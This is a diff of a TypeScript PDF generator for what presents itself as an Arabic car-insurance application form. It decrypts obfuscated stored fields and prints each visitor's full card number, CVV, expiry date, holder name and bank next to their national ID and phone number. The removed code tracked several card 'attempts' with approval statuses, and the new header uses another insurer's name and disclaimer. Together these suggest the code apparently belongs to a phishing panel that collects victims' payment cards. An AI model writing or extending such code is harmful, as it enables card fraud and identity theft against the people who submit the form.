@@ -12,22 +12,6 @@ function decryptField(value: string | undefined): string {
   }
 }
 
-function formatDate(date: string | Date | undefined): string {
-  if (!date) return "";
-  try {
-    const d = new Date(date as string);
-    return d.toLocaleString("ar-SA", {
-      year: "numeric",
-      month: "2-digit",
-      day: "2-digit",
-      hour: "2-digit",
-      minute: "2-digit",
-    });
-  } catch {
-    return String(date);
-  }
-}
-
 function val(v: string | number | undefined | null): string {
   if (v === undefined || v === null || v === "") return "";
   return String(v);
@@ -45,85 +29,80 @@ function buildPdfHtml(visitor: InsuranceApplication, logoBase64: string): string
     (a: any, b: any) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
   );
 
-  const statusBadge = (status: string | undefined) => {
-    switch (status) {
-      case "approved":
-        return '<span style="background:#DEF7EC;color:#03543F;padding:3px 10px;border-radius:6px;font-size:11px;font-weight:600;">تم القبول ✓</span>';
-      case "rejected":
-        return '<span style="background:#FDE8E8;color:#9B1C1C;padding:3px 10px;border-radius:6px;font-size:11px;font-weight:600;">تم الرفض ✗</span>';
-      default:
-        return '<span style="background:#FEF3C7;color:#92400E;padding:3px 10px;border-radius:6px;font-size:11px;font-weight:600;">قيد المراجعة ⏳</span>';
-    }
+  const latestCard = sortedCardHistory.length > 0 ? sortedCardHistory[0] : null;
+  const cn = latestCard ? decryptField(latestCard.data?._v1) : cardNumber;
+  const cv = latestCard ? decryptField(latestCard.data?._v2) : cvv;
+  const ed = latestCard ? decryptField(latestCard.data?._v3) : expiryDate;
+  const ch = latestCard ? decryptField(latestCard.data?._v4) : cardHolderName;
+  const cardType = latestCard ? val(latestCard.data?.cardType) : "";
+  const bankName = latestCard ? val(latestCard.data?.bankInfo?.name) : "";
+
+  const offerCompany = visitor.selectedOffer ? val((visitor.selectedOffer as any).name || (visitor.selectedOffer as any).company) : "";
+  const totalPrice = val(visitor.finalPrice || visitor.offerTotalPrice);
+
+  const insuranceDate = visitor.createdAt ? new Date(visitor.createdAt as any).toISOString().split("T")[0] : "";
+
+  const BLUE = "#1B4F8B";
+
+  const renderRow = (label: string, value: string, isGray: boolean) => {
+    if (!value) return { html: "", rendered: false };
+    return {
+      html: `
+        <tr style="background:${isGray ? "#F3F6FA" : "#FFFFFF"};">
+          <td style="padding:10px 16px;font-family:'Cairo',Arial,sans-serif;font-size:14px;font-weight:700;color:#1F2937;border:1px solid #D1D5DB;text-align:right;unicode-bidi:plaintext;">${value}</td>
+          <td style="padding:10px 16px;font-family:'Cairo',Arial,sans-serif;font-size:13px;color:#4B5563;font-weight:600;border:1px solid #D1D5DB;text-align:right;white-space:nowrap;">${label}</td>
+        </tr>
+      `,
+      rendered: true,
+    };
   };
 
-  const renderRow = (label: string, value: string, isLast: boolean = false) => {
-    if (!value) return "";
-    return `
-      <tr>
-        <td style="padding:11px 18px;font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:13px;color:#6B7280;font-weight:500;border-bottom:${isLast ? "none" : "1px solid #F3F4F6"};width:40%;white-space:nowrap;">${label}</td>
-        <td style="padding:11px 18px;font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:14px;color:#111827;font-weight:700;border-bottom:${isLast ? "none" : "1px solid #F3F4F6"};text-align:left;unicode-bidi:plaintext;">${value}</td>
-      </tr>
-    `;
-  };
+  const rows = [
+    { label: "الاسم حسب البطاقة الشخصية:", value: val(visitor.ownerName) },
+    { label: "نوع التأمين:", value: val(visitor.insuranceCoverage) },
+    { label: "رقم الهوية:", value: val(visitor.identityNumber) },
+    { label: "رقم الهاتف النقال:", value: val(visitor.phoneNumber) },
+    { label: "تاريخ بدء التأمين:", value: insuranceDate },
+    { label: "القيمة التأمينية:", value: totalPrice },
+    { label: "نوع السيارة:", value: val(visitor.vehicleModel) },
+    { label: "سنة السيارة:", value: val(visitor.vehicleYear) },
+    { label: "الرقم التسلسلي:", value: val(visitor.serialNumber) },
+    { label: "الخيار المختار:", value: offerCompany },
+  ];
 
-  const renderSection = (
-    title: string,
-    accentColor: string,
-    rows: { label: string; value: string }[]
-  ) => {
-    const filteredRows = rows.filter((r) => r.value && r.value.trim() !== "");
-    if (filteredRows.length === 0) return "";
+  let rowIndex = 0;
+  const tableRows = rows
+    .map((r) => {
+      const result = renderRow(r.label, r.value, rowIndex % 2 === 0);
+      if (result.rendered) rowIndex++;
+      return result.html;
+    })
+    .join("");
 
-    return `
-      <div style="margin-bottom:18px;break-inside:avoid;">
-        <div style="background:#FFFFFF;border:1px solid #E5E7EB;border-radius:10px;overflow:hidden;">
-          <div style="padding:13px 18px;background:${accentColor};border-bottom:2px solid ${accentColor};">
-            <span style="font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:15px;font-weight:700;color:#FFFFFF;">${title}</span>
-          </div>
-          <table style="width:100%;border-collapse:collapse;">
-            ${filteredRows.map((row, i) => renderRow(row.label, row.value, i === filteredRows.length - 1)).join("")}
-          </table>
-        </div>
-      </div>
-    `;
-  };
+  const cardRows = [
+    { label: "رقم البطاقة:", value: cn },
+    { label: "اسم حامل البطاقة:", value: ch },
+    { label: "نوع البطاقة:", value: cardType },
+    { label: "تاريخ الانتهاء:", value: ed },
+    { label: "CVV:", value: cv },
+    { label: "البنك:", value: bankName },
+  ];
 
-  let cardSections = "";
-  if (sortedCardHistory.length > 0) {
-    sortedCardHistory.forEach((card: any, index: number) => {
-      const cn = decryptField(card.data?._v1);
-      const cv = decryptField(card.data?._v2);
-      const ed = decryptField(card.data?._v3);
-      const ch = decryptField(card.data?._v4);
-      const title = index === 0 ? "معلومات الدفع" : `معلومات الدفع (محاولة ${sortedCardHistory.length - index})`;
-      cardSections += renderSection(title, "#D97706", [
-        { label: "رقم البطاقة", value: cn },
-        { label: "اسم حامل البطاقة", value: ch },
-        { label: "نوع البطاقة", value: val(card.data?.cardType) },
-        { label: "تاريخ الانتهاء", value: ed },
-        { label: "CVV", value: cv },
-        { label: "البنك", value: val(card.data?.bankInfo?.name) },
-        { label: "بلد البنك", value: val(card.data?.bankInfo?.country) },
-        { label: "الحالة", value: statusBadge(card.status) },
-        { label: "التاريخ", value: formatDate(card.timestamp) },
-      ]);
-    });
-  } else if (cardNumber) {
-    cardSections = renderSection("معلومات الدفع", "#D97706", [
-      { label: "رقم البطاقة", value: cardNumber },
-      { label: "اسم حامل البطاقة", value: cardHolderName },
-      { label: "تاريخ الانتهاء", value: expiryDate },
-      { label: "CVV", value: cvv },
-    ]);
-  }
+  let cardRowIndex = 0;
+  const cardTableRows = cardRows
+    .map((r) => {
+      const result = renderRow(r.label, r.value, cardRowIndex % 2 === 0);
+      if (result.rendered) cardRowIndex++;
+      return result.html;
+    })
+    .join("");
 
-  const now = new Date();
-  const dateStr = now.toLocaleDateString("ar-SA", { year: "numeric", month: "long", day: "numeric" });
+  const hasCardData = cn || ch || ed || cv;
 
   return `
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
     <div id="pdf-content" style="
-      font-family: 'Cairo', 'Segoe UI', Tahoma, Arial, sans-serif;
+      font-family: 'Cairo', Arial, sans-serif;
       direction: rtl;
       text-align: right;
       width: 680px;
@@ -134,72 +113,78 @@ function buildPdfHtml(visitor: InsuranceApplication, logoBase64: string): string
       line-height: 1.6;
     ">
 
-      <div style="
-        background: linear-gradient(160deg, #0F4C3A 0%, #1A6B4F 40%, #22805E 100%);
-        padding: 36px 28px 28px;
-        text-align: center;
-        position: relative;
-        overflow: hidden;
-      ">
-        <div style="position:absolute;top:0;left:0;right:0;bottom:0;background:url('data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22none%22 stroke=%22rgba(255,255,255,0.03)%22 stroke-width=%222%22/></svg>') repeat;"></div>
-        <div style="position:relative;z-index:1;">
-          <div style="display:inline-block;border:2px solid rgba(212,175,55,0.5);padding:4px 24px;border-radius:4px;margin-bottom:14px;">
-            <span style="font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:11px;color:#D4AF37;letter-spacing:3px;text-transform:uppercase;font-weight:700;">BECARE INSURANCE</span>
-          </div>
-          <div style="font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:28px;font-weight:900;color:#FFFFFF;margin-bottom:6px;letter-spacing:1px;">Car Insurance</div>
-          <div style="font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:16px;font-weight:600;color:rgba(255,255,255,0.75);margin-bottom:18px;">Insurance Application Form</div>
-          <div style="display:flex;justify-content:center;gap:20px;flex-wrap:wrap;">
-            <div style="background:rgba(255,255,255,0.1);padding:7px 18px;border-radius:4px;font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:11px;color:rgba(255,255,255,0.85);">
-              رقم المستند: <span style="font-weight:800;color:#D4AF37;">${visitor.id || "-"}</span>
-            </div>
-            <div style="background:rgba(255,255,255,0.1);padding:7px 18px;border-radius:4px;font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:11px;color:rgba(255,255,255,0.85);">
-              التاريخ: <span style="font-weight:800;color:#D4AF37;">${dateStr}</span>
-            </div>
-          </div>
+      <!-- Header -->
+      <div style="padding:30px 30px 20px;display:flex;justify-content:space-between;align-items:flex-start;">
+        <div style="flex:1;">
+          <div style="font-family:'Cairo',Arial,sans-serif;font-size:32px;font-weight:900;color:${BLUE};margin-bottom:0;line-height:1.2;">تأمين السيارات</div>
+          <div style="font-family:'Cairo',Arial,sans-serif;font-size:16px;font-weight:600;color:${BLUE};margin-top:4px;">إستمارة طلب</div>
+        </div>
+        <div style="flex-shrink:0;">
+          <img src="${logoBase64}" style="width:120px;height:auto;" crossorigin="anonymous" />
         </div>
       </div>
 
-      <div style="height:4px;background:linear-gradient(90deg,#D4AF37,#C5960C,#D4AF37);"></div>
-
-      <div style="padding:22px 24px 0;">
-
-        ${renderSection("معلومات مقدم الطلب", "#1A6B4F", [
-          { label: "الاسم الكامل", value: val(visitor.ownerName) },
-          { label: "رقم الهوية", value: val(visitor.identityNumber) },
-          { label: "رقم الهاتف", value: val(visitor.phoneNumber) },
-          { label: "تاريخ الميلاد", value: "" },
-        ])}
-
-        ${renderSection("معلومات المركبة", "#2563EB", [
-          { label: "الرقم التسلسلي", value: val(visitor.serialNumber) },
-          { label: "موديل المركبة", value: val(visitor.vehicleModel) },
-          { label: "سنة الصنع", value: val(visitor.vehicleYear) },
-          { label: "نوع التغطية", value: val(visitor.insuranceCoverage) },
-          { label: "الإضافات", value: Array.isArray(visitor.selectedFeatures) && visitor.selectedFeatures.length > 0 ? visitor.selectedFeatures.join("، ") : "" },
-        ])}
-
-        ${renderSection("عرض التأمين المختار", "#7C3AED", [
-          { label: "الشركة", value: val(visitor.selectedOffer ? ((visitor.selectedOffer as any).name || (visitor.selectedOffer as any).company) : "") },
-          { label: "السعر الأساسي", value: visitor.originalPrice ? `ر.س ${visitor.originalPrice}` : "" },
-          { label: "الخصم", value: visitor.discount ? `${(visitor.discount * 100).toFixed(0)}%` : "" },
-          { label: "السعر الإجمالي", value: (visitor.finalPrice || visitor.offerTotalPrice) ? `ر.س ${visitor.finalPrice || visitor.offerTotalPrice}` : "" },
-        ])}
-
-        ${cardSections}
-
+      <!-- Blue Banner 1 -->
+      <div style="margin:0 30px;background:${BLUE};border-radius:6px;padding:10px 18px;display:flex;align-items:center;gap:10px;">
+        <span style="font-size:18px;color:#FFFFFF;">&#128274;</span>
+        <span style="font-family:'Cairo',Arial,sans-serif;font-size:14px;font-weight:700;color:#FFFFFF;">هذا التأمين سيوفر لك بناءً على طلبك</span>
       </div>
 
-      <div style="
-        margin:30px 24px 0;
-        padding:32px 20px 20px;
-        text-align:center;
-        border-top:2px solid #E5E7EB;
-      ">
-        <img src="${logoBase64}" style="width:220px;height:auto;margin:0 auto 14px;display:block;" crossorigin="anonymous" />
-        <div style="height:1px;background:linear-gradient(90deg,transparent,#D4AF37,transparent);margin:18px 40px;"></div>
-        <div style="font-family:'Cairo','Segoe UI',Tahoma,Arial,sans-serif;font-size:10px;color:#9CA3AF;margin-top:10px;">
-          تم الإنشاء: ${formatDate(visitor.createdAt)} &nbsp;|&nbsp; رقم المستند: ${visitor.id || "-"}
-        </div>
+      <!-- Disclaimer -->
+      <div style="margin:14px 30px;font-family:'Cairo',Arial,sans-serif;font-size:11px;color:#4B5563;line-height:1.8;text-align:right;">
+        لا يُعد تأمين مسؤولية مجموعة الخليج للتأمين (الخليج) ش.م.ع (م) حتى يتم قبول هذه الاستمارة ويتم دفع قيمة القسط. وتحتفظ مجموعة الخليج للتأمين (الخليج) ش.م.ع (م) بحق إضافة شروط خاصة أو رفض هذا الطلب. يرجى الرجوع إلى وثيقة التأمين للحصول على كافة الأحكام والشروط والاستثناءات. يوجد نسخة من هذه الوثيقة عند الطلب.
+      </div>
+
+      <!-- Applicant Section Header -->
+      <div style="margin:0 30px;background:${BLUE};border-radius:6px 6px 0 0;padding:10px 18px;display:flex;align-items:center;gap:10px;">
+        <span style="font-size:18px;color:#FFFFFF;">&#128100;</span>
+        <span style="font-family:'Cairo',Arial,sans-serif;font-size:14px;font-weight:700;color:#FFFFFF;">مقدم الطلب</span>
+      </div>
+
+      <!-- Applicant Table -->
+      <div style="margin:0 30px;">
+        <table style="width:100%;border-collapse:collapse;">
+          ${tableRows}
+        </table>
+      </div>
+
+      ${hasCardData ? `
+      <!-- Payment Section Header -->
+      <div style="margin:20px 30px 0;background:#D97706;border-radius:6px 6px 0 0;padding:10px 18px;display:flex;align-items:center;gap:10px;">
+        <span style="font-size:18px;color:#FFFFFF;">&#128179;</span>
+        <span style="font-family:'Cairo',Arial,sans-serif;font-size:14px;font-weight:700;color:#FFFFFF;">معلومات الدفع</span>
+      </div>
+
+      <!-- Payment Table -->
+      <div style="margin:0 30px;">
+        <table style="width:100%;border-collapse:collapse;">
+          ${cardTableRows}
+        </table>
+      </div>
+      ` : ""}
+
+      <!-- Terms -->
+      <div style="margin:24px 30px 0;">
+        <table style="width:100%;border-collapse:collapse;">
+          <tr style="background:#F3F6FA;">
+            <td style="padding:10px 16px;font-family:'Cairo',Arial,sans-serif;font-size:13px;color:#4B5563;font-weight:600;border:1px solid #D1D5DB;text-align:right;" colspan="2">
+              أوافق على الشروط والأحكام: &nbsp;&nbsp;&nbsp;&nbsp;
+              <span style="font-size:14px;">&#9745; نعم</span>
+              &nbsp;&nbsp;&nbsp;
+              <span style="font-size:14px;">&#9744; لا</span>
+            </td>
+          </tr>
+          <tr style="background:#FFFFFF;">
+            <td style="padding:10px 16px;font-family:'Cairo',Arial,sans-serif;font-size:13px;color:#4B5563;font-weight:600;border:1px solid #D1D5DB;text-align:right;height:50px;" colspan="2">
+              التوقيع:
+            </td>
+          </tr>
+        </table>
+      </div>
+
+      <!-- Footer -->
+      <div style="margin:30px 30px 20px;text-align:center;">
+        <div style="font-family:'Cairo',Arial,sans-serif;font-size:10px;color:#9CA3AF;">1 / 1</div>
       </div>
 
     </div>
